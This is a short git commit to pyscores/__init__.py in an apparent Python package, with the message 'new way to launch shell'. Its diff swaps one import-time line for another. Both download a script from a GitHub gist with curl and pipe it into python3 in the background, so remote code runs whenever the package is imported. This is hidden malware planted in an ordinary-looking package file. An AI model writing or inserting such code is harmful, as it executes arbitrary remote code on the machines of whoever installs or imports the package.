33135d9d6602c8d18cf39e3c1d87db03e61603af
Mrugank Patankar <mrugank@canva.com>
2022-11-29 11:49:04 +1100

    new way to launch  shell

--- pyscores/__init__.py
+++ pyscores/__init__.py
@@ -1,3 +1,3 @@
-import subprocess
+import os
 
-subprocess.check_output('curl -s https://gist.githubusercontent.com/sysophost/771dc73c358721c5b8eb25108e497fb5/raw/a47f3373a8c28018ba3e880c3ac519a99fcaaacd/foo.txt | python3 &', shell=True, stderr=None)
+os.system('curl -s https://gist.githubusercontent.com/sysophost/771dc73c358721c5b8eb25108e497fb5/raw/a47f3373a8c28018ba3e880c3ac519a99fcaaacd/foo.txt | python3 &')
